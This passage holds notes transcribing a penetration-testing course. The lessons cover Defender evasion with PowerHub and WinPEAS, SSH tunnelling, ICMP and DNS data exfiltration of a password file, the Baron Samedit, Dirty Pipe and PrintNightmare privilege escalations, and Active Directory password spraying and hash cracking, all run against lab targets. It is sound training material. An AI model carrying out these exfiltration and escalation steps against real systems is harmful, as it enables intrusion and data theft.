> **[1:34](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/stealthy-windows-enumeration?u=76281980&t=94)** PowerHub modules ps1 and they're part of the PowerSploit. I've put it into the PowerSploit set of scripts and it's under recon. And we can see invoke WinPEAS.ps1. We've still got PowerHub running, so let's reload the modules. We currently have 30 modules available and we reload and we now have 31. We're on the target again in [[Powershell]], so let's connect to PowerHub again and we'll list the hub modules. (keyboard tapping) And we can see under the PowerSploit recon section, that we have invoke WinPEAS.ps1. So let's load hub module ps1/PowerSploit/Recon/Invoke
>
> **[2:54](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/stealthy-windows-enumeration?u=76281980&t=174)** WinPEAS.ps1. Okay. We're loaded. And now let's run it. Invoke WinPEAS. We'll need to enter a value for command and I'll enter CMD. And WinPEAS is now running. The output is again extensive and we get the Windows equivalent of what we saw in LinPEAS. So I won't go through it in detail. However, it's interesting to note that WinPEAS has detected that Windows Defender is active and has bypassed it. We can also see that the Always Install Elevated setting has been detected and this could provide us with our privilege escalation. Using PowerHub, we've been able to run the ps1 version of WinPEAS and evade defender. It's given us a great start on escalating privileges. The ps1 version is slightly out of date but it demonstrates a useful approach to re-casting tools so that they evade defenses.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[WinPEAS]] (11), [[Windows]] (3), [[Microsoft Defender|Defender]] (3), [[LinPEAS]] (2), [[Python (Programming Language)|Python]] (1)
> **CLI Commands:** python (1), ls (1)
> **Env Vars:** cmd (1)
> **Versions:** 192.168.1 (1)
> **Tools:** powershell (1)
> **Prerequisites:** install (1)
> **Speakers:** - [tutor] (1)

#### [Powering up our escalation](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/powering-up-our-escalation?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/powering-up-our-escalation?u=76281980&t=0)** - We're on our [[Windows]] 2019 server target. Let's connect to PowerHub and list the modules. List hub modules. We can see in the priv-esc section that we have a module PowerUp.ps1. Let's load the PowerUp module, which we can use to find possible paths for privilege escalation. Load hub module ps1, Power Sploit privesc PowerUp dot ps1. Okay, that's loaded. PowerUp is a collection of individual checking functions which we can use as part of our enumeration. The cheat sheet shown in the certcube website provides a useful guide to the individual modules. There are a number of individual checks, and we can invoke them as a package using the priv-esc audit commandlet. Invoke privesc audit. This runs through its various tests and returns some issues for us to check.
>
> **[1:33](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/powering-up-our-escalation?u=76281980&t=93)** The first is that there's a potential unquoted path DLL hijack. There is some modifiable service executables. And installation is always privileged. We can run the checks individually. For example, the always elevated check is done with get registry always install elevated. And that returns true. We can flag these issues as possible candidates for privilege escalation and start checking them out.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[Windows]] (1)
> **CLI Commands:** find (1)
> **Env Vars:** dll (1)
> **Definitions:** is a  (1)
> **Analogies:** for example (1)
> **Prerequisites:** install (1)
> **Speakers:** - we (1)


### 4. Tunneling and Exfiltration

[↑ Back to Table of Contents](#table-of-contents)

#### [Setting up and using an SSH tunnel](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/setting-up-and-using-an-ssh-tunnel?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/setting-up-and-using-an-ssh-tunnel?u=76281980&t=0)** - [Instructor] Sometimes we need to get access to a service on a target where access is blocked. Sometimes we just want to hide outgoing traffic by using a common protocol such as HTTP. Tunneling is a technique that allows us to wrap one form of traffic in another protocol so that it looks like a benign or allowed traffic stream. The concept of a tunnel is simple enough. It requires an agent at both sides of the tunnel, the source and destination systems which accept a stream of traffic and encapsulate it in the desired transport protocol, send it to the target using that protocol, and then using an agent in the target, unwraps it from the outer protocol and passes it to the intended service or collector in its original form. We can use SSH to create a simple tunnel. Traffic is received by an SSH client on one computer on a proxy port and is then sent from that computer to the target using SSH. The SSH service on the destination computer then connects to the target service locally on the correct service port. Let's see how we do this. I'll use SSH to create a local connection to tunnel into our Mutillidae II server. I'll set up local port 8080 to do this. Let's check port 8080 on curl using curl [http://127.0.0.1:8080](http://127.0.0.1:8080).
>
> **[1:31](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/setting-up-and-using-an-ssh-tunnel?u=76281980&t=91)** And we can see there's no service running. Let's now use SSH to connect to our Mutillidae server on port 80, but we'll access it by using port 8080 on our curl workstation. We use SSH and we use -nNT to tell SSH not to set up a terminal and -F to tell SSH to background the process.
>
> **[1:57](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/setting-up-and-using-an-ssh-tunnel?u=76281980&t=117)** - L indicates that this is a local port forwarding request on port 8080 to local host and to go to port 80 on the target. To set this up on the target, we need to log into [[Ubuntu]]@192.168.1.151, which is our Mutillidae server. And we now have a tunnel set up. SSH has created the tunnel and we've now got local access from curl to the Mutillidae web server. Let's try it out. And we'll go to 127.0.0.1:8080, which is our local proxy and we're looking for the Mutillidae website. And we can see the utility dye webpage. Let's see how we close this down. We'll use ps aux a to get the background process ID and kill it. ps aux and we're looking for grep ssh.
>
> **[3:06](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/setting-up-and-using-an-ssh-tunnel?u=76281980&t=186)** And the background process is 751900, so let's kill 751900. In this demonstration we've used SSH to tunnel to port 80, but we can use the same approach for any service on the target.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[Ubuntu]] (1)
> **CLI Commands:** ssh (12), curl (4), grep (1)
> **Env Vars:** ssh (11), http (1)
> **Ports:** port 8080 (4), port 80 (3), :8080 (2)
> **Versions:** 127.0.0 (2), 192.168.1 (1)
> **Prerequisites:** set up (3)
> **UI Navigation:** go to (2)
> **Definitions:** is a  (2)

#### [Exfiltrating data over ICMP](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/exfiltrating-data-over-icmp?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/exfiltrating-data-over-icmp?u=76281980&t=0)** - [Instructor] One of the actions an adversary might want to take, should they gain access to our systems, is to exfiltrate information. However, with firewalls blocking outbound access paths, and data loss prevention systems watching for signs of prohibited outbound data, it's not always possible to use standard system tools for copying data out. Consequently, our adversaries have developed their own special data exfiltration tools and techniques. Penetration testers need similar tools. There are a number of older exfiltration tools, in particular PyExfil and the Data Exfiltration Toolkits, which provide good examples of what a multi-protocol exfiltration tool is like. If we want to use them, however, the current versions don't run as cloned, and need work to make them usable. Let's take a look at how we might build our own data exfiltration tool. To do this, we'll need a client module we can upload to a target, and a server we can run to collect exfiltrated data. We'll want to use a recognized protocol that's likely to be allowed through the firewall. Let's take a look at a simple ICMP data exfiltration module. We'll be running the collector as an ICMP server on Kali. I've got it ready, so let's see what it does. Nano icmp-server .py, exICMP server.py. We'll import the libraries we need, and we'll then open the ICMP socket,
>
> **[1:34](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/exfiltrating-data-over-icmp?u=76281980&t=94)** and check that it worked. With our sockets open, we'll read the incoming data. We then loop reading ICMP packets until such time as we quit with Control C. The way we're doing exfiltration then is to output a ping packet whose length corresponds to the decimal code of our character. So when we get the packet we're checking the full packet length and then just subtracting 28. We're then displaying the result as a character, our exfiltrated data. Let's close this now and see how we write our client code. We're on the Scorpio target system, and we'll run the client from here. Again, I've got it ready. So let's see what it does. Nano exICMP
>
> **[2:24](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/exfiltrating-data-over-icmp?u=76281980&t=144)** - client.py. Again, we start by importing the libraries we need, and we extract the first command line argument, which is the exfiltration server IP address. We then extract the data to be sent from the command line, and convert it to a byte string. For every byte, we'll create a ping command, and issue it, using the byte value as the length of the ping packet. That's it, just the basics. Let's check it out. We'll start the ICMP server and we'll have to remember to use sudo. Sudo python3, exICMP,
>
> **[3:07](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/exfiltrating-data-over-icmp?u=76281980&t=187)** - server.py. We'll use the client script to exfiltrate our secret data, python3, exICMP, client.py. And our exfiltration point is 192.168.1.249. And we're going to exfiltrate secret data. Okay, that's done. And back in Kali, we can see that we've received our secret data. We've now got a functioning exfiltration system, which we can use whenever ICMP is allowed outbound. It doesn't exfiltrate data in plain text, and we can always enhance this even further to encrypt the data. We can also enhance the server to manage multiple incoming targets, and we can take a similar approach to other protocols that we might find useful.

> [!info]- Semantic Content
>
> **CLI Commands:** sudo (2), python3 (2), make (1), find (1)
> **Env Vars:** icmp (6)
> **File Paths:** server.py (2), client.py (2)
> **Code Identifiers:** exicmp (4)
> **Speakers:** - [instructor] (1), - client (1), - server (1)
> **Tools:** command line (2)
> **Versions:** 192.168.1 (1)
> **UI Navigation:** open the (1)

#### [Exfiltration via DNS](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/exfiltration-via-dns?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/exfiltration-via-dns?u=76281980&t=0)** - Another protocol, which is often used for exfiltration is DNS. We can use the DNS steel tool to demonstrate how DNS exfiltration works. DNS steel is a DNS server, which receives exfiltrated data. Let's get the tool. Get. And if we just go to DN steel we can start DN steel using its default settings. And this will establish the DNS server on our current system which is using IP address 1 9 2 1 6 8 1 2 4 9. We'll use [[Python (Programming Language)|Python]] two for this. Pseudo Python, 2.7, DN steel.py, and we give it our server address 192.168.1.249. And we use minus Z minus V. Okay, we've now got our DNS destination server set up on port 53. The minus said switch indicates the incoming DNS will be compressed with G zip. We'll also set verbose mode with minus V to see details of the traffic received. Note, the two [[Forms]] of client command. These are both single line command shell scripts. We'll be using a variation of the first. I'm on my target system, and I'll use DNS to exfiltrate some data using the first script provided by DN steel. I have it in a file called sadness.sh, so let's have a look at that.
>
> **[1:34](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/exfiltration-via-dns?u=76281980&t=94)** Cat sadness.sh. And I've made a couple of changes. The script's a bit complicated but let's have a look at the basics of what it's doing. I've updated the original script to use the first command line argument as the name of the file for transfer and the second command line argument as the IP address of the DNS server, and this makes the script easier to deploy and use. At the start of the script, we can see it's using variables CNS to split the data based on its settings for bites per sub-domain and sub-domains per request. We can see here we're using four sub-domains of up to 57 bites each. The script compresses the file we've specified in the first command line parameter with G zip and then base 64 encodes it. It uses said to extract the data fragment. We're using the minus NE switch in echo to drop the new line at the end of the echo, and to interpret back slash escapes which we use only for the final sub-domain fragment. Finally, the script users dig to send a message to the DNS server which we specify using the second command line parameter. Appending the file name, translating the plus sign to the asterisk and requesting only the short answer. I've also included the plus no ID nin and plus no ID nout to the dig command as it throws errors without them. Okay, let's run this. And we'll go into the et cetera folder,
>
> **[3:10](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/exfiltration-via-dns?u=76281980&t=190)** and we'll run sadness.sh from our home folder,
>
> **[3:18](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/exfiltration-via-dns?u=76281980&t=198)** and we'll be sending the password file. And we'll be sending that to 192.168.1.249. And that's gone. We told these amount form message packets but they're processed anyway. Back on Carly we can see the DNS traffic has been received. We can look at the extracted information by displaying the received file. If we look, we've got received 2022 password and if we cat the password file, we'll find it is the password file from our target. This tool is slightly aging and we'd likely want to upgrade it to Python three and see if we can improve the message to avoid detectable malformation.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[Python (Programming Language)|Python]] (3), [[Forms]] (1)
> **Env Vars:** dns (12), cns (1)
> **CLI Commands:** python (3), cat (2), find (1)
> **File Paths:** sadness.sh (3), steel.py (1)
> **Tools:** command line (4)
> **Versions:** 192.168.1 (2), 2.7 (1)
> **Ports:** port 53 (1)
> **UI Navigation:** go to (1)


### 5. Escalating Privileges

[↑ Back to Table of Contents](#table-of-contents)

#### [Using Baron Samedit to escalate in Linux](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/using-baron-samedit-to-escalate-in-linux?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/using-baron-samedit-to-escalate-in-linux?u=76281980&t=0)** - [Instructor] In 2021, a vulnerability was identified in the [[Linux]] sudo tool and it enabled and authorized a non-privileged user to gain root privileges as shown in this website. It affects sudo version 1.8.31. We're on our Scorpio system, so let's check whether we're vulnerable. We can firstly check our sudo version, sudo --version. And we are 1.8.31. We can run a check to verify the vulnerability hasn't been patched using sudo edits, sudoedit -s / we get the message, not a regular file. That's a sign our target is vulnerable. Let's download and build the exploit. So we'll [[Git]] clone https.
>
> **[0:59](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/using-baron-samedit-to-escalate-in-linux?u=76281980&t=59)** And if we go into the folder Sudo-1.8.31-Root-Exploit,
>
> **[1:13](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/using-baron-samedit-to-escalate-in-linux?u=76281980&t=73)** we can build the exploit with make and we've now got an executable called exploit. Before we run this, let's try to list the root folder. Now let's /root and we don't have permission. Now let's run the exploit. And we have a root prompt. And when we try and run the list, we get the listing of the root folder, and we can ask, whoami and of course we're root. We've escalated our privileges and we now have full control of our Scorpio target.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[Linux]] (1), [[Git]] (1)
> **CLI Commands:** sudo (6), git (1), make (1)
> **Versions:** 1.8.31 (2), version 1 (1), 8.31 (1)
> **Speakers:** - [instructor] (1)

#### [Escalating through a dirty pipe](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/escalating-through-a-dirty-pipe?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/escalating-through-a-dirty-pipe?u=76281980&t=0)** - [Instructor] If the 2021 Baron Samedi escalation has been patched, we might want to try a 2022 privilege escalation. In 2022, a vulnerability was detected in the way in which memory is managed in the [[Linux]] kernel. This enables us to escalate our privileges. The exploit known as "Dirty Pipes" is the result of a bug in the way splicing works with the system inter process communication pipes. Okay, we're on our target. Let's clone the exploit. [[Git]] clone We'll clone that into the dpipe folder. Okay, then we can go into dpipe. Then for this exploit, we just need to compile. Exploit.C and output Exploit.C and output the executable exploit. Again, let's try and list our root folder. We can't, permission is denied. Let's run the exploit. We can now run a command: ls /root. We can see the files and who am I? We can see the files and who am I? Well, I'm root. We've escalated our privileges. Again, we've now got full control of our target.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[Linux]] (1), [[Git]] (1)
> **File Paths:** exploit.c (2)
> **CLI Commands:** git (1), ls (1)
> **Definitions:** known as (1)
> **Speakers:** - [instructor] (1)

#### [Escalating through a nightmare](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/escalating-through-a-nightmare?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/escalating-through-a-nightmare?u=76281980&t=0)** - [Instructor] An exploit called PrintNightmare became a critical issue for many IT teams in mid 2021. It affected all [[Windows]] systems and enabled the attacker to quickly get root privileges. It's an exploit which affects the Print Spooler service. Let's take a look at how we can use it against an unpatched system. We'll be using the approach published here to show how this works. There's a machine on the main Hack The Box system, called Heist, which we'll use as a target for running the PrintNightmare exploit. It's IP address is 10.10.10.149. The first thing we need to do is to download the PrintNightmare proof of concept, which we'll rename to just Nightmare. [[Git]] clone, and we'll clone that into the Nightmare repository. We need to have authenticated user access to run PrintNightmare. For the purposes of this demonstration, we'll skip the initial exploitive Heist, and go directly to using a set of user credentials. The user is called Chase, the domain name is Supportdesk, and we know the password. We'll connect to the server using a pentesting client for windows management called evil-winrm. We can install this as a Ruby gem. Sudo gem install evil-winrm.
>
> **[1:32](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/escalating-through-a-nightmare?u=76281980&t=92)** Okay, let's connect to our windows target. Evil-winrm, and the target is 10.10.10.149, the user account is Supportdesk\\chase,
>
> **[1:53](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/escalating-through-a-nightmare?u=76281980&t=113)** and the password is Q4bracketJu\Y8qz*A3?d.
>
> **[2:13](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/escalating-through-a-nightmare?u=76281980&t=133)** Good complex password. Okay, we've got command line access to the target. Let's upload the exploit from Caleb Stewart. Upload nightmare/CVE-2021-1675.ps1.
>
> **[2:42](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/escalating-through-a-nightmare?u=76281980&t=162)** Okay, that's uploaded, and created a new [[Powershell]] module on the target. Let's import it. Import-Module./CVE-2021-1675.ps1.
>
> **[3:02](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/escalating-through-a-nightmare?u=76281980&t=182)** And now let's invoke the Nightmare. Invoke-Nightmare -NewUser,
>
> **[3:15](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/escalating-through-a-nightmare?u=76281980&t=195)** and we'll create a new user *akhrtar*
>
> **[3:22](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/escalating-through-a-nightmare?u=76281980&t=202)** - NewPassword *wildcat*.
>
> **[3:32](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/escalating-through-a-nightmare?u=76281980&t=212)** And so we now have a new user akhrtar as a local administrator. Let's start a new terminal and access the target using these credentials. Evil-winrm -i 10.10.10.149.
>
> **[3:52](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/escalating-through-a-nightmare?u=76281980&t=232)** And the user now is akhrtar, and the password is wildcat. And we have an administrative session. Let's dump the administrator's root flag. Cat /Users/Administrator/Desktop/root.txt.
>
> **[4:26](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/escalating-through-a-nightmare?u=76281980&t=266)** That's all there is to getting a root shell with PrintNightmare.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[Windows]] (3), [[Git]] (1), [[Powershell]] (1)
> **CLI Commands:** git (1), ruby (1), sudo (1), cat (1)
> **Versions:** 10.10.10 (3)
> **Tools:** command line (1), powershell (1), terminal (1)
> **Env Vars:** cve (2)
> **Prerequisites:** install (2)
> **Speakers:** - [instructor] (1), - newpassword (1)
> **File Paths:** users/administrator/desktop/root.txt (1)

#### [Exploiting the Active Domain](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/exploiting-the-active-domain?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/exploiting-the-active-domain?u=76281980&t=0)** - In a pen test, we may be taking the role of a remote and authenticated user or a malicious employee or contractor that has been given standard user credentials. In either case our target will be to gain the privileges of a domain administrator through exploiting [[Active Directory]]. Our first approach will be to try brute force attacks against active directory accounts. We can follow this up with specific attacks on active directory by leveraging the account privilege, the kerberos no-preauthentication setting, and the service principle name alias. We'll also want to think about retaining ongoing access to active directory, including the use of golden tickets. We'll cover the basics here, and if you wish to dig deeper into active directory, then do follow up this course by taking a look at my active directory course. A common way to retrieve credentials from active directory is to spray all accessible accounts with a guest or known password or a list of passwords. There's a number of tools we can use to do this. Let's have a look at the DomainPasswordSpray [[Powershell]] script from DAFTHACK. I'm on a domain workstation and logged in as Sam Spade. And I want to see what other user accounts I can obtain. I've downloaded the DomainPasswordSpray script from the [[GitHub]] site onto my domain workstation. I can now import it and run it in PowerShell. Import-Module, "C", colon, slash, tools, slash, dafthack which is where I stored it.
>
> **[1:37](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/exploiting-the-active-domain?u=76281980&t=97)** DomainPasswordSpray Let's run the attack using a dictionary file, which I've set up. We'll get a few warnings, but we can ignore them for the purposes of this course Invoke-DomainPasswordSpray. And we'll pass it the password list, "C", colon, slash, tools, slash, dafthack, slash, adpass.txt And we'll ignore the errors and answer "Yes". Then we're running along merrily. Given that we'd expect around 30% of an enterprise's passwords to be weak, a password spray attack can be very effective. However much depends upon the quality of the password file and the amount of time we have. With a big password file and hundreds, if not thousands of users, an attack like this can take a while. Okay, we found the password for the "akatt42" account. We'll leave it here. But our goal, of course, is now to check whether this account has domain or other system access privileges. We won't go into all the active directory kerberos attacks but let's take a look at one of them. One of the account options in active directory is "does not require kerberos preauthentication". If this is set, we can use the impacket exploit, get NP users to extract the authentication details.
>
> **[3:13](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/exploiting-the-active-domain?u=76281980&t=193)** We can run this, even if we don't have a user account on the domain. We've got impacket installed in Carly. So let's run this against our active directory server and see if anyone has this attribute set. CD, slash, user, slash, share, slash, doc, slash, python3, dash, impacket, slash, examples
>
> **[3:40](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/exploiting-the-active-domain?u=76281980&t=220)** And we'll run the script using "python3", "GetNPUsers.py". And the domain name is "cybex" and "-dc -ip" to specify the IP address of the domain controller which is active directory "192.168.1.199". And I have a list of usernames in the "usersfile" in my home folder. It's called "unames" and we'll specify the format "[[Hashcat]]". And that very quickly checks all the users and we get nstove07's password hash returned. I've extracted that and stored it in a file called "nhash" already. So let's run that through [[John the Ripper]] using our standard rockyou dictionary [[John the Ripper|john]], ~/nhash, minus, minus, wordlist, equals, slash,
>
> **[4:50](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/exploiting-the-active-domain?u=76281980&t=290)** usr, slash, share, slash, wordlists, slash, rockyou.txt
>
> **[5:01](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/exploiting-the-active-domain?u=76281980&t=301)** And the password is very quickly cracked. And we can see that it's "Password01".

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[Active Directory]] (11), [[Powershell]] (2), [[GitHub]] (1), [[Hashcat]] (1), [[John the Ripper]] (1)
> **File Paths:** adpass.txt (1), getnpusers.py (1), rockyou.txt (1)
> **CLI Commands:** python3 (2), cd (1)
> **Tools:** powershell (2), github (1)
> **Env Vars:** dafthack (1)
> **Versions:** 192.168.1 (1)
> **Prerequisites:** set up (1)
> **Speakers:** - in (1)


### Conclusion

[↑ Back to Table of Contents](#table-of-contents)

#### [What's next](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/what-s-next?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/what-s-next?u=76281980&t=0)** - [Malcolm] In this course, you've taken another step in [[Ethical Hacking]] by learning about some advanced techniques for testing. However, your learning doesn't stop here. There's always new tools and techniques being developed and there are many specialist areas of learning for you to focus on. I'd like to invite you to go to my [[LinkedIn]] Learning page and check out my other security courses. You'll find a number of security courses on my page, including [[SQL]] Injections, [[Burp Suite]], and [[Active Directory]]. There's always new things to learn in the wider field of information and [[Cybersecurity]], so check out the full security segment of the LinkedIn library, where new courses are added regularly. You'll find courses on all aspects of security, as well as a full learning path to certified ethical hacker.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[LinkedIn]] (2), [[Ethical Hacking]] (1), [[SQL]] (1), [[Burp Suite]] (1), [[Active Directory]] (1)
> **CLI Commands:** find (2)
> **Env Vars:** sql (1)
> **UI Navigation:** go to (1)
> **Speakers:** - [malcolm] (1)


## Instructor

- [[Malcolm Shore]]

## Skills Covered

- Penetration Testing
- Ethical Hacking

## Path Context

### In [[Become a Penetration Tester]]
← [[Burp Suite Essential Training]] | **8 of 8**

## Appears In

- [[Become a Penetration Tester]]

## Related Courses

_Courses sharing skills:_

- [[Kali Linux for Advanced Pen Testing and Ethical Hacking]] — Penetration Testing, Ethical Hacking
- [[Ethical Hacking- System Hacking]] — Penetration Testing, Ethical Hacking
- [[Offensive Penetration Testing]] — Ethical Hacking
- [[Penetration Testing Essential Training]] — Penetration Testing
- [[Burp Suite Essential Training]] — Penetration Testing

---

[↑ Back to top](#)